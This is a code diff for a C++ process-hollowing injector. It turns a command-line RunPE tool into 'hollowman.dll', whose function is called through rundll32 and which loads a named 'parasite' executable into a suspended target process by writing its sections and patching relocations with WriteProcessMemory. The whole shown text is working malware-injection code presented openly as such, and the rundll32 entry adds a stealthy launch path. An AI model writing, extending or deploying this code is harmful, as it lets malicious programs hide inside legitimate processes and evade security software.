@@ -1,4 +1,4 @@
-﻿#include <Windows.h>
+#include <Windows.h>
 #include <cstdio>
 #include <winternl.h>
 
@@ -16,7 +16,7 @@ struct ProcessAddressInformation
 typedef struct IMAGE_RELOCATION_ENTRY {
 	WORD Offset : 12;
 	WORD Type : 4;
-} IMAGE_RELOCATION_ENTRY, *PIMAGE_RELOCATION_ENTRY;
+} IMAGE_RELOCATION_ENTRY, * PIMAGE_RELOCATION_ENTRY;
 
 /**
  * Function to retrieve the PE file content.
@@ -288,7 +288,7 @@ IMAGE_DATA_DIRECTORY GetRelocAddress32(const LPVOID lpImage)
 	if (lpImageNTHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress != 0)
 		return lpImageNTHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
 
-	return {0, 0};
+	return { 0, 0 };
 }
 
 /**
@@ -540,7 +540,7 @@ BOOL RunPEReloc32(const LPPROCESS_INFORMATION lpPI, const LPVOID lpImage)
 			PatchedAddress += DeltaImageBase;
 
 			WriteProcessMemory(lpPI->hProcess, (LPVOID)AddressLocation, &PatchedAddress, sizeof(DWORD), nullptr);
-			
+
 		}
 	}
 
@@ -619,7 +619,7 @@ BOOL RunPEReloc64(const LPPROCESS_INFORMATION lpPI, const LPVOID lpImage)
 		const auto lpImageSectionHeader = (PIMAGE_SECTION_HEADER)((uintptr_t)lpImageNTHeader64 + 4 + sizeof(IMAGE_FILE_HEADER) + lpImageNTHeader64->FileHeader.SizeOfOptionalHeader + (i * sizeof(IMAGE_SECTION_HEADER)));
 		if (ImageDataReloc.VirtualAddress >= lpImageSectionHeader->VirtualAddress && ImageDataReloc.VirtualAddress < (lpImageSectionHeader->VirtualAddress + lpImageSectionHeader->Misc.VirtualSize))
 			lpImageRelocSection = lpImageSectionHeader;
-		
+
 
 		const BOOL bWriteSection = WriteProcessMemory(lpPI->hProcess, (LPVOID)((UINT64)lpAllocAddress + lpImageSectionHeader->VirtualAddress), (LPVOID)((UINT64)lpImage + lpImageSectionHeader->PointerToRawData), lpImageSectionHeader->SizeOfRawData, nullptr);
 		if (!bWriteSection)
@@ -699,68 +699,107 @@ BOOL RunPEReloc64(const LPPROCESS_INFORMATION lpPI, const LPVOID lpImage)
 	return TRUE;
 }
 
-int main(int argc, char* argv[]) {
-	if (argc != 3) { printf("[HELP] runpe.exe <pe_file> <target_process>\n"); return -1; }
-	lpSourceImage = argv[1];
-	lpTargetProcess = argv[2];
+// --------------------------------------------------------
+// Refactor all of main()’s logic into one function:
+bool DoHollow(const char* srcPath, const char* targetCmdLine) {
+	// 1) load source PE into memory
+	HANDLE hFileContent = GetFileContent((LPSTR)srcPath);
+	if (!hFileContent) return false;
+	if (!IsValidPE(hFileContent)) {
+		HeapFree(GetProcessHeap(), 0, hFileContent);
+		return false;
+	}
 
-	printf("[PROCESS HOLLOWING]\n");
-	LPVOID hFileContent = GetFileContent(lpSourceImage);
-	if (!hFileContent) return -1;
-	printf("[+] PE file content : 0x%p\n", hFileContent);
-	if (!IsValidPE(hFileContent)) { printf("[-] The PE file is not valid!\n"); HeapFree(GetProcessHeap(), 0, hFileContent); return -1; }
-	printf("[+] The PE file is valid.\n");
-
+	// 2) create pipe for child stdout/stderr
 	SECURITY_ATTRIBUTES sa = { sizeof(sa), nullptr, TRUE };
 	HANDLE childOutR = NULL, childOutW = NULL;
-	CreatePipe(&childOutR, &childOutW, &sa, 0);
+	if (!CreatePipe(&childOutR, &childOutW, &sa, 0)) {
+		HeapFree(GetProcessHeap(), 0, hFileContent);
+		return false;
+	}
 	SetHandleInformation(childOutR, HANDLE_FLAG_INHERIT, 0);
 
-	STARTUPINFOA SI;
-	ZeroMemory(&SI, sizeof(SI));
-	SI.cb = sizeof(SI);
-	SI.dwFlags = STARTF_USESTDHANDLES;
-	SI.hStdInput = GetStdHandle(STD_INPUT_HANDLE);
-	SI.hStdOutput = childOutW;
-	SI.hStdError = childOutW;
+	// 3) set up STARTUPINFOA to redirect output
+	STARTUPINFOA si = { sizeof(si) };
+	si.dwFlags = STARTF_USESTDHANDLES;
+	si.hStdInput = GetStdHandle(STD_INPUT_HANDLE);
+	si.hStdOutput = childOutW;
+	si.hStdError = childOutW;
 
-	PROCESS_INFORMATION PI;
-	ZeroMemory(&PI, sizeof(PI));
+	// 4) launch target suspended
+	PROCESS_INFORMATION pi = {};
 	if (!CreateProcessA(
-		NULL,
-		lpTargetProcess,
-		NULL, NULL,
-		TRUE,
+		nullptr,
+		(LPSTR)targetCmdLine,
+		nullptr, nullptr,
+		TRUE,                      // inherit handles
 		CREATE_SUSPENDED,
-		NULL, NULL,
-		&SI, &PI
-	)) {
-		printf("[-] CreateProcessA failed\n");
-		CloseHandle(childOutR);
+		nullptr, nullptr,
+		&si, &pi
+	))
+	{
 		CloseHandle(childOutW);
+		CloseHandle(childOutR);
 		HeapFree(GetProcessHeap(), 0, hFileContent);
-		return -1;
+		return false;
 	}
 	CloseHandle(childOutW);
 
-	bool injected = false;
-	if (!IsPE32(hFileContent)) { injected = RunPE64(&PI, hFileContent); }
-	else { injected = RunPE32(&PI, hFileContent); }
-	if (!injected) {
-		printf("[-] Injection failed!\n");
-		CleanAndExitProcess(&PI, hFileContent);
-		CloseHandle(childOutR);
-		return -1;
-	}
+	// 5) inject
+	bool injected;
+	if (IsPE32(hFileContent))
+		injected = RunPE32(&pi, hFileContent);
+	else
+		injected = RunPE64(&pi, hFileContent);
 
+	// 6) read any output until the process ends
 	CHAR buf[4096];
 	DWORD n;
-	while (ReadFile(childOutR, buf, sizeof(buf) - 1, &n, NULL) && n) {
-		buf[n] = '\0';
+	while (ReadFile(childOutR, buf, sizeof(buf) - 1, &n, nullptr) && n) {
+		buf[n] = 0;
 		printf("%s", buf);
 	}
 
-	CleanProcess(&PI, hFileContent);
+	// 7) cleanup
+	CleanProcess(&pi, hFileContent);
 	CloseHandle(childOutR);
-	return 0;
+	return injected;
+}
+
+// --------------------------------------------------------
+// Exported entry for rundll32:
+extern "C" __declspec(dllexport)
+void CALLBACK HollowEntry(
+	HWND      hwnd,        // unused
+	HINSTANCE hinst,       // unused
+	LPSTR     lpszCmdLine, // "<parasite.exe> <target.exe>"
+	int       nCmdShow     // unused
+) {
+	// parse lpszCmdLine into two parts
+	char src[MAX_PATH] = { 0 }, tgt[2 * MAX_PATH] = { 0 };
+	LPSTR split = strchr(lpszCmdLine, ' ');
+	if (!split) {
+		MessageBoxA(NULL,
+			"Usage:\n"
+			"  rundll32 hollowman.dll,HollowEntry <parasite.exe> <target.exe>",
+			"hollowman.dll error",
+			MB_OK | MB_ICONERROR);
+		return;
+	}
+	*split = '\0';
+	strcpy_s(src, lpszCmdLine);
+	strcpy_s(tgt, split + 1);
+
+	if (!DoHollow(src, tgt)) {
+		MessageBoxA(NULL,
+			"Process hollowing failed.",
+			"hollowman.dll error",
+			MB_OK | MB_ICONERROR);
+	}
+}
+
+// --------------------------------------------------------
+// DllMain is optional if you don’t need it:
+BOOL WINAPI DllMain(HINSTANCE, DWORD, LPVOID) {
+	return TRUE;
 }
